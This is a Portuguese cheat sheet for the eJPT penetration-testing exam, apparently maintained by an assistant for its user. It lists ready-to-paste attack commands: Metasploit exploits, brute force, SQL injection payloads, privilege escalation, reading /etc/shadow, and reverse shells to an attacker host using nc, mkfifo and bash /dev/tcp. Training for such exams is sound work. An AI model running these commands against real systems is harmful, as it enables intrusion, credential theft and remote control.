# CHEAT SHEET eJPT — Comandos Exatos
Atualizado 2026-10-14 (véspera do exame) e **revisado 2026-10-18** com testes reais na máquina de apoio.
Uso: LIBERTUS copia daqui e manda pronto pro Lorran colar.
Substituir `IP` = alvo, `LHOST` = IP do Kali (descobrir com `ip addr`), `RANGE` = ex 192.168.100.

---

## ⚡ REGRAS DE OURO (validadas no lab, 18/out)

1. **Arquivo de ferramenta snap → sempre em `$HOME`.** nmap, sqlmap, msfconsole e msfvenom vêm de snap
   e **não enxergam `/tmp`** (`Failed to open input file /tmp/...`, `does not exist`).
   Lista de alvos → `~/targets.txt`. Request do Burp → `~/req.txt`. Payload → `~/payloads/x.elf`.
2. **Metasploit agora tem banco** (`msfdb init` feito). Usar `creds`, `hosts`, `services`, `loot`,
   `db_import ~/scan.xml`. Se cair: `msfdb restart`.
3. **John só via `john`** (wrapper `~/bin/john` → `~/john-home/john`). `/usr/local/bin/john` está quebrado.
4. **hydra local não faz SSH nem RDP.** SSH → `ssh_brute.py` ou msf `ssh_login`. RDP → msf `rdp_scanner`.
5. **Falso positivo de hydra existe.** DVWA 1.10 deu `admin:123456789` sem ser verdade (CSRF token).
   Sempre confirmar com `curl -i` antes de responder questão.
6. **Gobuster em SPA** (React/Angular) devolve 200 em tudo → `--exclude-length N` (o próprio erro informa N).
7. **`nc` local é OpenBSD: não tem `-e`.** Reverse shell com `mkfifo` ou `bash -i >& /dev/tcp/...`.
8. **Sessão msf aberta trava o `exit`** → `exit -y`.

## 📋 FORMATO DO EXAME (eJPT v2 / INE — conferido em Out/2026)
- **35 questões** de múltipla escolha sobre um lab prático, **48 horas** de acesso.
- Aprovação: **70%** (~25 de 35). Média de conclusão relatada: 6-12h.
- Domínios: Metodologia **25%** · Auditoria de hosts/redes **25%** · Pentest de hosts/redes **50%**.
- **Metasploit é permitido e esperado** (diferente do OSCP).
- Estratégia: **ler a questão primeiro** — o enunciado diz qual serviço/host investigar. Não escanear às cegas.

---

## 0. DESCOBERTA INICIAL (sempre começar aqui)
```bash
ip addr                              # descobrir IP do Kali e a rede
ip route                             # ver gateways/rotas (dica de rede interna)
nmap -sn RANGE.0/24                  # ping sweep — lista hosts vivos
```
Excluir da contagem: `.1` (gateway) e o IP do próprio Kali.

---

## 1. NMAP
### Scans base
```bash
nmap -sV -sC IP                      # versão + scripts default (padrão de entrada)
nmap -p- -T4 IP                      # TODAS as 65535 portas TCP
nmap -sV -p- -T4 IP                  # completo (mais lento)
nmap -A IP                           # OS + versão + scripts + traceroute
nmap -sU --top-ports 20 IP           # UDP top 20 (SNMP 161, TFTP 69, etc.)
nmap -Pn IP                          # se host bloqueia ping mas está vivo
nmap -sV -oN scan.txt IP             # salvar output em arquivo
```
### Flags úteis
- `-sV` versão de serviço · `-sC` scripts default · `-O` OS (pode ser unreliable)
- `-p 80,443,445` portas específicas · `-p-` todas · `-T4` rápido
- `-Pn` pular ping · `-oN arquivo` salvar · `-v` verbose
- `--reason` **mostra POR QUE o nmap achou o host up/down** — usar sempre que
  o resultado parecer errado (`arp-response`, `syn-ack`, `user-set`, `no-response`)

### "Host seems down" — a decisão medida (lab 18/10/2026)
| Situação | O que decide | O que fazer |
|---|---|---|
| Mesma rede local (/24) | **ARP** — responde mesmo com `iptables -P INPUT DROP` | se diz down, o host está desligado; não precisa `-Pn` |
| Através de roteador/VPN/pivô | ICMP echo + SYN/443 + ACK/80 + timestamp | **`-Pn` sempre** — host com ICMP filtrado é invisível |
| Via proxychains (SOCKS) | só `connect()` em **80 e 443** | `-Pn` é obrigatório; `-sn` pelo proxy não descobre nada |
| Descobrir por SOCKS sem `-Pn` | `-PS<porta real>` (vira connect) | `nmap -sn -PS22,80,443,445,8080 IP` |
| `-p X` deu "host down" | a porta **nunca foi testada** | repetir com `-Pn` antes de concluir |

```bash
# custo medido numa /24: discovery 26,3 s (e esconde ICMP-filtrado)
#                        -Pn       2,2 s (e mostra tudo)
nmap -sn -PS22,80,443,445,8080 IP     # discovery em rede roteada
nmap -Pn -p- -T4 IP                   # pivô: não perde tempo com ping
nmap -Pn -p8080 --reason IP           # open/syn-ack vs filtered/no-response
```
Regra: `filtered` ≠ `down`. `filtered` = host vivo, firewall dropando.
Análise completa + pcaps: `evolucao/analise_2026-10-18_host-discovery-nmap-arp.md`

### NSE relevantes no exame
```bash
# SMB (o mais importante)
nmap -p445 --script smb-os-discovery IP          # versão exata do Windows (MELHOR que -O)
nmap -p445 --script smb-vuln-ms17-010 IP         # EternalBlue — confirma antes de explorar
nmap -p445 --script "smb-vuln-*" IP              # todas vulns SMB (ms17-010, ms08-067, conficker...)
nmap -p445 --script smb-enum-shares,smb-enum-users,smb-enum-domains IP
nmap -p139,445 --script smb-security-mode,smb2-security-mode IP   # assinatura SMB

# FTP
nmap -p21 --script ftp-anon IP                   # login anônimo permitido?
nmap -p21 --script ftp-* IP                      # ftp-bounce, ftp-vsftpd-backdoor, ftp-proftpd-backdoor

# HTTP
nmap -p80,8080 --script http-enum IP             # enumera dirs/apps conhecidos
nmap -p80 --script http-title,http-headers IP
nmap -p80 --script http-wordpress-enum IP        # CMS WordPress
nmap -p80 --script http-shellshock IP            # CGI shellshock
nmap -p80 --script http-methods IP               # métodos (PUT habilitado = upload)

# SSH (bruteforce via nmap — funciona mesmo sem hydra SSH)
nmap -p22 --script ssh-brute --script-args userdb=users.txt,passdb=/usr/share/wordlists/rockyou.txt IP
nmap -p22 --script ssh-auth-methods IP           # quais métodos de auth o servidor aceita
```

---

## 2. METASPLOIT
### Fluxo padrão
```bash
msfconsole -q
search TERMO                         # ex: search ms17-010
use exploit/CAMINHO                  # ex: use exploit/windows/smb/ms17_010_eternalblue
info                                 # detalhes do módulo
show options                         # ver o que precisa configurar
set RHOSTS IP
set LHOST LHOST_DO_KALI
run                                  # ou 'exploit'
# se "Cannot reliably check exploitability":
set ForceExploit true
run
```
### ONELINER (usar no lab INE — copy/paste múltiplo quebra)
```bash
msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS IP; set LHOST LHOST; run"
```
### Módulos mais cobrados
```bash
# MS17-010 EternalBlue (SMB/445) — o mais frequente no eJPT
use exploit/windows/smb/ms17_010_eternalblue
# Verificar antes:
use auxiliary/scanner/smb/smb_ms17_010

# MS17-010 via psexec (alternativa quando eternalblue falha)
use exploit/windows/smb/ms17_010_psexec

# FTP anonymous / vsftpd backdoor
use auxiliary/scanner/ftp/anonymous
use exploit/unix/ftp/vsftpd_234_backdoor

# SSH bruteforce
use auxiliary/scanner/ssh/ssh_login
set RHOSTS IP; set USERNAME root; set PASS_FILE /usr/share/wordlists/rockyou.txt; set STOP_ON_SUCCESS true; run

# Drupal (visto no exame real)
use exploit/unix/webapp/drupal_drupalgeddon2
set RHOSTS IP; set TARGETURI /drupal; run

# Handler p/ receber shell de exploit manual
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST LHOST; set LPORT 4444; run

# Upgrade shell simples -> meterpreter
use post/multi/manage/shell_to_meterpreter
set SESSION 1; run
```
> Verificado hoje: `ms17_010_eternalblue`, `vsftpd_234_backdoor`, `ssh_login`, `autoroute`, `socks_proxy`, `multi/handler` todos presentes no MSF local.
### Meterpreter — pós-exploração
```bash
sysinfo · getuid · getprivs · hashdump
shell                                # cai no shell nativo
background                           # volta pro msf mantendo a sessão
sessions -l                          # listar sessões
sessions -i 1                        # interagir com sessão 1
search post/multi/manage/shell_to_meterpreter   # upgrade shell->meterpreter
```

---

## 3. HYDRA
```bash
# SSH
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://IP
hydra -L users.txt -P pass.txt ssh://IP -t 4

# FTP
hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://IP

# HTTP POST (formulário de login) — ajustar campos e a string de falha
hydra -l admin -P /usr/share/wordlists/rockyou.txt IP http-post-form \
  "/login.php:username=^USER^&password=^PASS^:F=incorrect"

# HTTP GET Basic Auth
hydra -l admin -P pass.txt IP http-get /admin
```
Flags: `-l` user único · `-L` lista users · `-p` senha única · `-P` lista senhas · `-t N` threads · `-f` para no 1º hit · `-s PORTA`.
**Pitfall:** rockyou+SSH é LENTÍSSIMO (~9000h estimado no exame). Preferir credenciais achadas em arquivos/CMS, ou wordlist pequena. Usar hydra só quando há alvo pequeno/óbvio.

### SSH bruteforce — fallbacks (hydra LOCAL não tem SSH)
No Kali da INE o hydra tem SSH. No apoio LOCAL do LIBERTUS o hydra foi compilado sem libssh → usar:
```bash
# 1) script próprio (paramiko, testado contra SSH real)
~/venvs/pentest/bin/python ~/LIBERTUS/ejpt/ssh_brute.py -t IP -l root -P ~/wordlists/pass/top10k.txt -T 4 -s
~/venvs/pentest/bin/python ~/LIBERTUS/ejpt/ssh_brute.py -t IP -L ~/wordlists/user/top-usernames.txt -P ~/wordlists/pass/top1000.txt

# 2) Metasploit (recomendado — abre sessão)
msfconsole -q -x "use auxiliary/scanner/ssh/ssh_login; set RHOSTS IP; set USERNAME root; set PASS_FILE /home/libertus/wordlists/pass/top10k.txt; set STOP_ON_SUCCESS true; set VERBOSE true; run; exit -y"
# depois: sessions -l  /  sessions -i 1

# 3) nmap
nmap -p22 --script ssh-brute --script-args userdb=~/users.txt,passdb=~/wordlists/pass/top10k.txt IP

# 4) wrapper local com sshpass
bash ~/LIBERTUS/ejpt/sshbrute.sh IP root /home/libertus/wordlists/pass/top10k.txt
```
**Mito a evitar:** rockyou inteiro (14M) em SSH = horas. Usar top1000/top10k ou credenciais já achadas. `-f`/`-s` para no primeiro acerto.

### RDP (3389) — hydra local também NÃO tem
```bash
# detectar versão e se RDP está exposto
nmap -p3389 -sV --script rdp-enum-encryption,rdp-ntlm-info IP
# bruteforce com Metasploit
msfconsole -q -x "use auxiliary/scanner/rdp/rdp_login; set RHOSTS IP; set USERNAME administrator; \
 set PASS_FILE /home/libertus/wordlists/pass/top10k.txt; set STOP_ON_SUCCESS true; run; exit -y"
# acesso
xfreerdp /v:IP /u:usuario /p:senha /cert:ignore
```
BlueKeep (CVE-2019-0708): `exploit/windows/rdp/cve_2019_0708_bluekeep_rce` — só em Win7/2008.

---

## 4. GOBUSTER
```bash
# Diretórios (wordlists novas, mais completas — baixadas 18/out)
gobuster dir -u http://IP -w ~/wordlists/web/directory-list-2.3-medium.txt -t 50 --no-error
gobuster dir -u http://IP -w ~/wordlists/web/directory-list-2.3-small.txt -x php,txt,html -t 50
gobuster dir -u http://IP:8080 -w /usr/share/wordlists/common.txt -t 50
gobuster dir -u http://IP -w ~/wordlists/web/raft-small-words.txt -x php -t 40

# SPA (React/Angular/Juice Shop): tudo devolve 200 -> excluir o tamanho do 404 falso
gobuster dir -u http://IP -w ~/wordlists/web/raft-small-words.txt --exclude-length 9903 -t 40

# DNS/vhost
gobuster vhost -u http://IP -w ~/wordlists/web/subdomains-5000.txt --append-domain
gobuster dns -d dominio.local -w ~/wordlists/web/subdomains-5000.txt
```
Flags: `-u` URL · `-w` wordlist · `-x` extensões · `-t` threads · `-s` status codes ·
`-b` blacklist · `--no-error` (não aborta em erro) · `--exclude-length` (mata wildcard de SPA).
Wordlists locais: `~/wordlists/web/*` (SecLists) e `/usr/share/wordlists/common.txt`.
No Kali INE: `/usr/share/wordlists/dirb/common.txt` (common.txt da raiz não existe).
`gobuster version` NÃO existe — use `gobuster -h`.

---

## 5. SQLMAP
```bash
# Detecção
sqlmap -u "http://IP/page.php?id=1" --batch
sqlmap -u "http://IP/page.php?id=1" --dbs --batch        # listar bancos
sqlmap -u "http://IP/page.php?id=1" -D nome --tables --batch
sqlmap -u "http://IP/page.php?id=1" -D nome -T users --dump --batch
# POST / cookies
sqlmap -u "http://IP/login.php" --data="user=a&pass=b" --batch
sqlmap -u "http://IP/page" --cookie="PHPSESSID=xxx" --batch
# Shell / arquivo
sqlmap -u "..." --os-shell --batch
```
Flags: `--batch` (sem perguntas) · `--dbs` · `--tables` · `--dump` · `-D`/`-T`/`-C` · `--level 3 --risk 2` (mais agressivo) · `--cookie`.

---

## 6. NETCAT
```bash
# Listener no atacante (Kali)
nc -lvnp 4444

# Reverse shell (rodar NO ALVO)
nc -e /bin/sh LHOST 4444                 # Linux com nc que tem -e
nc -e cmd.exe LHOST 4444                 # Windows
# Sem -e (nc BSD/Linux moderno):
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc LHOST 4444 >/tmp/f
bash -i >& /dev/tcp/LHOST/4444 0>&1      # sem nc nenhum (bash puro)

# Bind shell (alvo escuta, atacante conecta)
nc -lvnp 4444 -e /bin/sh                 # no alvo
nc IP 4444                               # no atacante

# Transferência de arquivo
nc -lvnp 4444 > recebido.txt             # recebedor
nc IP 4444 < arquivo.txt                 # enviador

# Banner grab
nc -nv IP 21
```
Após pegar shell: estabilizar com `python3 -c 'import pty;pty.spawn("/bin/bash")'`.

---

## 7. PIVOTING (Metasploit) — OBRIGATÓRIO no exame
Depois de ter uma sessão meterpreter num host dual-homed:
```bash
# Dentro do meterpreter — descobrir rede interna
run get_local_subnets            # ou: shell -> ip addr / ipconfig /all

# Adicionar rota automática para a rede interna
run autoroute -s 192.168.0.0/24
# (ou manual do msf:)
background
route add 192.168.0.0 255.255.255.0 1     # 1 = id da sessão
route print

# Agora scanners do msf alcançam a rede interna
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.0.0/24; set PORTS 22,80,445,3306; run

# Port forward (acessar serviço interno via localhost do Kali)
# no meterpreter:
portfwd add -l 3389 -p 3389 -r 192.168.0.10
portfwd list

# SOCKS proxy para usar nmap/hydra na rede interna via proxychains
use auxiliary/server/socks_proxy
set VERSION 4a; set SRVPORT 1080; run
# depois: proxychains nmap -sT -Pn 192.168.0.10
```
Sequência mental: sessão no host de borda → `ipconfig /all`/`ip addr` p/ achar 2ª rede → `autoroute` → portscan interno → explorar/portfwd.

---

## 8. ESCALADA DE PRIVILÉGIO (Linux) — gap da 1ª tentativa
```bash
# SUID (o clássico do eJPT)
find / -perm -4000 -type f 2>/dev/null
# se 'find' for SUID:
/usr/bin/find . -exec /bin/sh -p \; -quit
# sudo mal configurado
sudo -l
# consultar GTFOBins pro binário achado

# hashes
cat /etc/passwd; cat /etc/shadow
# quebrar
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

## 9. QUEBRA DE HASH (John)
```bash
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
john --show hash.txt
john hash.txt --format=NT --wordlist=rockyou.txt      # NTLM Windows
# apoio local LIBERTUS:
bash ~/LIBERTUS/ejpt/john_home/jl.sh hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

---
## 10. ARSENAL LOCAL LIBERTUS (fora do exame — simulação/validação)
Ferramentas extras no Ubuntu do Lorran (verificadas 14/10):
```bash
nikto -h http://IP                       # scanner web geral (SSL OK)
ffuf -u http://IP/FUZZ -w /usr/share/wordlists/common.txt   # fuzzing rápido
nuclei -u http://IP -severity critical,high                 # templates de vuln
subfinder -d dominio.com                                    # subdomínios
proxychains: AUSENTE → usar socks_proxy do MSF + route add (não precisa de proxychains no host)
searchsploit: AUSENTE → usar https://www.exploit-db.com no navegador ou 'msfconsole search'
wpscan: AUSENTE → usar 'nmap --script http-wordpress-enum' + manual
```

---

## LEMBRETES DO LAB INE
- Terminal Kali via browser NÃO cola (Ctrl+V/Shift+V/botão meio falham) e NÃO digita "?". Workarounds: barra do Chrome para URLs com "?", webshell de host comprometido para colar, msfconsole `-x` para comandos compostos, Telegram como fonte de cópia.
- rockyou em `.gz` no Kali INE → `gunzip` antes. common.txt não existe lá.
- Reutilizar credenciais em TODOS os serviços — tema recorrente.

---

# ADENDO 19/OUT — o que foi EXECUTADO hoje (e o que isso muda no comando)

## A. SMB — cadeia completa validada (era só teoria antes)

**Enum anônimo de shares**
```bash
smbclient -L //IP -N
smbclient -L //IP -N --option='client min protocol=NT1' --option='client max protocol=NT1'   # alvo SMB1 antigo
```
**Acessar share com credencial**
```bash
smbclient //IP/SHARE -U 'usuario%senha' -c 'ls'
smbclient //IP/SHARE -U 'usuario%senha' -c 'more arquivo.txt'    # `cat` não existe no smbclient novo
smbclient //IP/SHARE -U 'usuario%senha' -c 'get arquivo.txt'
```
> `cat` dá `command not found`; o comando é **`more`**. Erro comum e que faz perder tempo no exame.

**Sem smbclient (ou para automatizar) — Impacket**
```bash
~/venvs/pentest/bin/smbclient.py usuario:'senha'@IP
~/venvs/pentest/bin/psexec.py usuario:'senha'@IP          # shell SYSTEM se admin
~/venvs/pentest/bin/wmiexec.py usuario:'senha'@IP
~/venvs/pentest/bin/secretsdump.py usuario:'senha'@IP
```
**Bruteforce SMB (hydra local NÃO tem smb)**
```bash
msfconsole -q -x "use auxiliary/scanner/smb/smb_login; set RHOSTS IP; set SMBUser usuario; set PASS_FILE ~/pass.txt; set STOP_ON_SUCCESS true; set VERBOSE true; run"
```
*Validado hoje: achou `analyst:LabPass123!` em 172.28.77.11. Sem `VERBOSE true` o msf não imprime o acerto.*

## B. SQLi com sessão — o fluxo que realmente extrai dados

```bash
# 1) pegar o cookie (login real)
curl -s -c ~/ck.txt http://IP/login.php -o ~/login.html
TOKEN=$(grep -oP "name='user_token' value='\K[0-9a-f]+" ~/login.html)
curl -s -b ~/ck.txt -c ~/ck.txt -d "username=admin&password=password&Login=Login&user_token=$TOKEN" http://IP/login.php
# 2) usar o cookie no sqlmap
sqlmap -u "http://IP/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="$(grep PHPSESSID ~/ck.txt | awk '{print $7}'); security=low" --batch --dbs
```
*Validado hoje:* detectou boolean/error/time/UNION e dumpou `dvwa.users` (5 linhas + hashes md5).
Hash `5f4dcc3b5aa765d61d8327deb882cf99` = `password` (john confirmou).

## C. Regra de confirmação (hydra mente)

Hoje o hydra devolveu **duas** senhas para o mesmo formulário; só uma era verdadeira.
**Todo acerto de hydra é suspeito até confirmação:**
```bash
curl -s -i -d "username=admin&password=SENHA" http://IP/login.php | head -20
# ou tentar o login de verdade no navegador / no serviço
```
Se a aplicação usa **token CSRF** (DVWA 1.10 usa), hydra http-post-form **não é confiável** —
preferir login manual com credencial conhecida, ou msf/http_login, ou script próprio.

## D. Reverse shell — teste de loopback

`nc -lvnp 4455` + `bash -i >& /dev/tcp/127.0.0.1/4455 0>&1` → **Connection received** ✅
(o `nc` local é OpenBSD: sem `-e`; as variantes com `mkfifo` e `/dev/tcp` do §6 são as que valem).

---

# ADENDO 20/OUT — MUDANÇAS QUE VALEM COMANDO NOVO (verificado na máquina, 11:06-11:20)

## E.1 — Wordlists: o msf NÃO lê `/usr/share` (novo, importante)

O msfconsole é snap. `set PASS_FILE /usr/share/wordlists/rockyou.txt` **falha na validação**:
```
[-] Msf::OptionValidateError One or more options failed to validate: PASS_FILE.
```
| Ferramenta | Pode usar `/usr/share/wordlists`? | Onde apontar |
|---|---|---|
| msfconsole / msfvenom (snap) | ❌ | `/home/libertus/wordlists/pass/top10k.txt` |
| hydra, gobuster, john, nmap `--script-args` | ✅ | qualquer caminho |
| nmap/sqlmap lendo ARQUIVO (`-iL`, `-r`) | ❌ `/tmp` | `~/targets.txt`, `~/req.txt` |

Tradução prática: no msf **nunca** colar `/usr/share/wordlists/rockyou.txt`.
Colar `/home/libertus/wordlists/pass/top10k.txt` (ou `top1000.txt`) — testado, aceito, bruteforce roda.

## E.2 — Hydra: como saber em 10 segundos se ele vai mentir

Raiz do falso positivo (reproduzida hoje, medida): o formulário do DVWA responde
`302` com **corpo vazio** — falha `Location: login.php`, acerto `Location: index.php`.
A string `F=Login failed` nunca aparece no corpo → **todo palpite é "sucesso"**.
Some a isso o `user_token` (CSRF), que muda por sessão.

Teste antes de confiar:
```bash
curl -s -i -d "usuario=admin&senha=errado" http://IP/login.php | head -12
# corpo com texto de erro ("incorrect", "invalid", "Login failed") -> hydra é confiável
# só 302 vazio / só Location -> hydra VAI mentir: usar login manual, impacket ou msf
```
Prova de que o hydra funciona quando o form é honesto (teste de hoje, form sem CSRF, porta 8099):
```
[8099][http-post-form] host: 127.0.0.1 ... login: admin   password: password
1 valid target successfully completed, 1 valid password found ✅   (3 tentativas, 1 segundo)
```
E a versão mentirosa, mesmo com `F=` correto no papel:
```
[8080][http-post-form] ... login: admin   password: errado   ← falso positivo
```
**Regra de exame:** hydra só em serviço com resposta clara (FTP, SSH, formulário sem CSRF).
Acerto de hydra = hipótese. Confirma com `curl -i` / login real **antes de responder questão**.

## E.3 — searchsploit AGORA EXISTE (antes era "AUSENTE")

```bash
searchsploit ms17-010                 # 6 resultados hoje: 42031.py (EternalBlue), 42315.py, 43970.rb...
searchsploit -w apache 2.4.49         # com URL do exploit-db
searchsploit -m 42315                 # copia o exploit pro diretório atual
searchsploit -p 42315                 # caminho completo no disco
searchsploit --update                 # git pull do exploitdb
```
Base: `~/exploitdb` (360 MB), binário `~/bin/searchsploit`, config `~/.searchsploit_rc`.
Serve para: versão de serviço vista no nmap → exploit público → ler o script e adaptar
(no eJPT a maioria se resolve com msf, mas Webmin/Drupal/plugaras antigas caem aqui).

## E.4 — proxychains4 AGORA EXISTE (fecha o pivot fora do msf)

```bash
# 1) no msfconsole, com a sessão do host de borda em background:
use auxiliary/server/socks_proxy
set VERSION 5
set SRVPORT 1080
set SRVHOST 127.0.0.1
run -j
# 2) no terminal do Kali:
proxychains4 nmap -sT -Pn -p22,80,445,8080 10.10.10.20
proxychains4 -q hydra -l admin -P ~/wordlists/pass/top1000.txt 10.10.10.20 ssh
proxychains4 curl -s http://10.10.10.20/
```
Config: `~/.local/etc/proxychains.conf` (strict_chain, `socks5 127.0.0.1 1080`, `proxy_dns`).
Pitfalls: via SOCKS só `-sT` (connect) funciona; **sempre `-Pn`**; nmap sem porta explícita
testa só 80/443 pelo proxy → `-p` sempre. UDP (SNMP) não passa.

## E.5 — Impacket: o smbclient que a máquina não tem (validado hoje)

```bash
~/venvs/pentest/bin/smbclient.py usuario:'senha'@IP            # shell interativo: shares, use, ls, cat, get
~/venvs/pentest/bin/psexec.py usuario:'senha'@IP               # SYSTEM se admin
~/venvs/pentest/bin/wmiexec.py usuario:'senha'@IP              # alternativa ao psexec
~/venvs/pentest/bin/secretsdump.py usuario:'senha'@IP          # hashes locais/SAM
~/venvs/pentest/bin/smbclient.py guest@IP -no-pass             # anônimo
```
Limites reais (medidos hoje):
- `-port` **só aceita 139/445**. Porta não padrão → `SMBConnection(ip, ip, sess_port=4450)`.
- `cat` funciona no smbclient.py do impacket (≠ smbclient do Samba, que exige `more`).
- `getFile(share, path, callback)` exige callback — não retorna bytes direto.
- `msf smb_login` recusa usuário/senha vazios (`Invalid Cred details can't be blank`) → anônimo = impacket.

## E.6 — Quanto tempo cada coisa leva (para não travar o exame)

| Comando | Tempo real medido / estimado |
|---|---|
| `nmap -sT -Pn -p<portas> IP` | 0,06 s (4 portas, local) |
| `gobuster dir` com `directory-list-2.3-small` (87k) | ~1-2 min por host (50 threads) |
| `sqlmap --banner` com sessão válida | ~10 s até o banner |
| `john --format=raw-md5` em 1.000 senhas | <1 s (12.800 p/s medido) |
| `john` rockyou inteiro em md5 | **~18 min** |
| `hydra` rockyou inteiro em SSH | **777-1943 h** — nunca fazer |
| `nc` + `/dev/tcp` reverse shell | instantâneo |

Regra: se o comando passa de 2 minutos, roda em background e segue para outro host.

---

# ADENDO 21/OUT — ARMADILHAS MEDIDAS HOJE (ler antes do exame)

Tudo aqui foi executado nesta máquina em 21/out. Onde diz "falso positivo", eu caí na armadilha
primeiro e depois achei a saída.

## F.1 hydra — o que ele realmente tem, e quando ele mente

Módulos compilados (lista real de `hydra -h`):
```
adam6500 asterisk cisco cisco-enable cobaltstrike cvs ftp http-{head|get|post}
http-{get|post}-form http-proxy http-proxy-urlenum icq imap irc ldap2 ldap3[s] mssql mysql(v4)
nntp pcanywhere pcnfs pop3 redis rexec rlogin rpcap rsh rtsp s7-300 smb smtp smtp-enum snmp
socks5 teamspeak telnet vmauthd vnc xmpp
```
**Não tem:** `ssh`, `sshkey`, `rdp`, `ftp[s]` (SSL), `smb2`, regex. Confirmado:
`hydra -l a -p b 127.0.0.1 ssh` → `[ERROR] Compiled without LIBSSH v0.4.x support`.

### Falso positivo — a armadilha que custa tempo no exame
```bash
hydra -l admin -P lista.txt 127.0.0.1 -s 8080 http-get /login.php
# saída: login: admin   password: admin     <-- MENTIRA
```
`http-get` considera sucesso qualquer resposta que não seja 401. Se a página devolve 200 para
todo mundo (formulário de login, por exemplo), **qualquer senha "funciona"**.
Nunca acreditar em resultado de `http-get`/`http-head` sem testar a senha na mão depois.

Forma correta — condição de falha explícita:
```bash
# http-post-form: URL:corpo:F=string_que_aparece_quando_ERRA
hydra -l admin -P ~/wordlists/pass/top1000.txt IP -s 8080 http-post-form \
  "/login.php:username=^USER^&password=^PASS^&Login=Login:F=Login failed"

# http-get-form (login por GET): mesma lógica
hydra -l admin -P ~/wordlists/pass/top1000.txt IP http-get-form \
  "/login.php:username=^USER^&password=^PASS^:F=Login failed"

# dica: achar a string de falha primeiro
curl -s -d "username=admin&password=errada&Login=Login" http://IP/login.php | grep -i "failed\|incorrect\|invalid"
```
`S=` (string de sucesso) é a alternativa quando não existe mensagem de erro clara.

**Se o formulário tiver CSRF token (hidden `user_token`/`csrf`), hydra NÃO funciona** — o token
muda a cada requisição. Caminho: Burp Intruder (Kali da INE) ou Python com `requests.Session`
lendo o token antes de cada POST (modelo pronto: `~/LIBERTUS/ejpt/web_login.py`).

## F.2 Metasploit — as duas regras do snap (validadas hoje)

```bash
# 1) comando avulso: usar -x, nunca arquivo em /tmp
msfconsole -q -x "search ms17-010; exit"

# 2) resource script: OBRIGATÓRIO estar em $HOME e SEM ponto no nome
msfconsole -q -r /home/libertus/msf.rc        # OK
msfconsole -q -r /tmp/msf.rc                  # [-] Cannot find resource script
msfconsole -q -r /home/libertus/.msf.rc       # Permission denied (Errno::EACCES)
```

Fluxo com banco (funciona — `msfdb status` = Database started):
```bash
msfconsole -q
db_nmap -sV -p- --min-rate 3000 IP    # scan já entra no banco
hosts                                  # hosts descobertos
services -R 10.10.10.5                 # só serviços daquele host
services -p 445                        # filtrar por porta = achar alvo rápido
```
`db_nmap` usa o nmap embutido do snap (7.95). O `nmap` da linha de comando é 7.992 — não é problema.

Verificação de módulo (fazer ANTES de usar, em 2 s):
```bash
msfconsole -q -x "info exploit/windows/smb/ms17_010_eternalblue; exit" | head -20
```
Módulos confirmados nesta máquina: `exploit/windows/smb/ms17_010_eternalblue`,
`exploit/windows/smb/ms17_010_psexec`, `auxiliary/admin/smb/ms17_010_command`,
`auxiliary/scanner/smb/smb_ms17_010`, `auxiliary/scanner/smb/smb_login`,
`auxiliary/scanner/ssh/ssh_login`, `auxiliary/scanner/portscan/tcp`,
`auxiliary/scanner/ftp/ftp_login`, `auxiliary/scanner/ftp/ftp_version`.

## F.3 Wordlists — caminhos que existem de verdade (contagem medida)

| Caminho | Palavras | Uso |
|---|---|---|
| `~/wordlists/web/directory-list-2.3-medium.txt` | 220.559 | gobuster completo (lento) |
| `~/wordlists/web/directory-list-2.3-small.txt` | 87.663 | gobuster padrão bom |
| `~/wordlists/web/raft-small-words.txt` | 43.007 | **melhor custo/benefício** |
| `~/wordlists/web/raft-medium-directories.txt` | 29.999 | só diretórios |
| `~/wordlists/web/subdomains-5000.txt` | 5.000 | vhost/dns |
| `~/wordlists/pass/top1000.txt` | 1.000 | hydra rápido |
| `~/wordlists/pass/top10k.txt` | 10.000 | hydra médio |
| `~/wordlists/user/top-usernames.txt` | 10 | usuários comuns |
| `/usr/share/wordlists/rockyou.txt` | 13.992.149 | john/hydra último recurso |
| `/usr/share/wordlists/common.txt` | 4.000 | web rápido |

`/usr/share` **não é visível para o msf** (snap). Para `PASS_FILE` no msf, usar caminho em `$HOME`.
No Kali da INE: `/usr/share/wordlists/dirb/common.txt` e `/usr/share/wordlists/rockyou.txt`.

## F.4 SQLmap em alvo autenticado (receita que rodou hoje)

SQLi atrás de login é o caso mais comum e o que mais trava. Sequência:
```bash
# 1) logar e pegar o cookie (Python, porque CSRF token exige ler a página antes)
python3 ~/LIBERTUS/ejpt/web_login.py -u http://IP/login.php -l admin -p password --extra "Login=Login"
# -> COOKIE_PARA_SQLMAP=PHPSESSID=abc123; security=low

# 2) sqlmap com a sessão
sqlmap -u "http://IP/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=abc123; security=low" --batch --dbs --threads=4
```
Resultado real de hoje no DVWA: 4 técnicas detectadas (boolean, error, time, UNION), DBMS
`MySQL >= 5.0 (MariaDB fork)`, banco `dvwa` listado.

Se sqlmap disser "not injectable": testar UNION na mão antes de desistir.
```bash
curl -s "http://IP/page?id=1' UNION SELECT 1,2,3-- -"
# contar colunas até a página parar de dar erro; depois:
curl -s "http://IP/page?id=1' UNION SELECT 1,user(),database(),4-- -"
```
Exemplo real (Juice Shop, funciona — sqlmap NÃO acha):
```bash
curl -s -G "http://localhost:3000/rest/products/search" \
  --data-urlencode "q=test')) UNION SELECT id,email,password,4,5,6,7,8,9 FROM Users--"
```

## F.5 john — formato certo ou ele "roda e não acha"

```bash
john --format=raw-md5      --wordlist=~/wordlists/pass/top10k.txt h.txt   # MD5 puro
john --format=nt           --wordlist=~/wordlists/pass/top10k.txt h.txt   # NTLM (Windows)
john --format=sha512crypt  --wordlist=~/wordlists/pass/top10k.txt h.txt   # /etc/shadow Linux
john --format=bcrypt       --wordlist=~/wordlists/pass/top10k.txt h.txt   # bcrypt
john --show h.txt                                                         # ver resultado
```
Hoje: 2 hashes MD5 do DVWA → `admin:password` em <1 s.
Se o `--format` estiver errado, john não reclama com clareza — só não acha nada. Na dúvida:
